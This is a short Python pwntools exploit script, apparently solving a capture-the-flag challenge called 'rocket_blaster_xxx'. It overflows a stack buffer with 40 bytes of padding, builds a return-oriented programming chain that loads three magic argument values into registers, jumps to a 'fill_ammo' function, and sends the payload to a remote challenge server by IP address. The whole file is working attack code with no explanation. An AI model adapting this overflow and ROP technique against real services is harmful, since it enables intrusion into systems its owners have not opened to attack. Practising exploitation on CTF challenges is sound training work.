#!/usr/bin/env python3

import argparse
import pwn


param_1 = pwn.p64(0xdeadbeef)
param_2 = pwn.p64(0xdeadbabe)
param_3 = pwn.p64(0xdead1337)


elf = pwn.ELF("./rocket_blaster_xxx")
#io = elf.process()
io = pwn.remote("94.237.54.245", 51766)

new_rip = elf.symbols["fill_ammo"]
rip_offset = 40


payload = b"".join([
    b"A" * rip_offset,
    pwn.p64(0x40101a),
    pwn.p64(0x40159f),
    pwn.p64(0xdeadbeef),   
    pwn.p64(0x40159d),
    pwn.p64(0xdeadbabe),
    pwn.p64(0x40159b),
    pwn.p64(0xdead1337),
    pwn.p64(new_rip),      
])


io.sendlineafter(b">>", payload)
io.stream()


